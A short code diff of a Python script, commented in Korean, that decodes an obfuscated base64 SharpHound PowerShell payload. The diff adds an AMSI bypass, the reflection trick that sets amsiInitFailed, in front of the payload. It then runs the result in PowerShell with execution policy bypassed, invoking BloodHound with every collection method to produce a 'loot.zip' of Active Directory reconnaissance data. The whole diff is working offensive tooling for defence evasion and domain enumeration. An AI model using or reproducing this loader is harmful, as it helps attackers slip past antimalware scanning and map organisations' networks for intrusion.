@@ -17,16 +17,26 @@ Invoke-Expression $decoded
 import subprocess
 import base64
 
+# base64 SharpHound 코드 로드
 with open("SharpHound_Obfuscated_Base64.txt", "rb") as f:
     b64code = f.read()
 
-ps_script = base64.b64decode(b64code).decode("utf-8")
+decoded = base64.b64decode(b64code).decode("utf-8")
 
-full_script = ps_script + "\nInvoke-BloodHound -CollectionMethod All -ZipFileName loot.zip\n"
+# AMSI Bypass 코드
+amsi_bypass = """
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\
+.GetField('amsiInitFailed','NonPublic,Static')\
+.SetValue($null,$true)
+"""
 
+# 결합 후 실행할 PowerShell 코드
+final_script = amsi_bypass + "\n" + decoded + "\nInvoke-BloodHound -CollectionMethod All -ZipFileName loot.zip\n"
+
+# 실행
 proc = subprocess.run(
     ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "-"],
-    input=full_script,
+    input=final_script,
     text=True,
     capture_output=True
 )
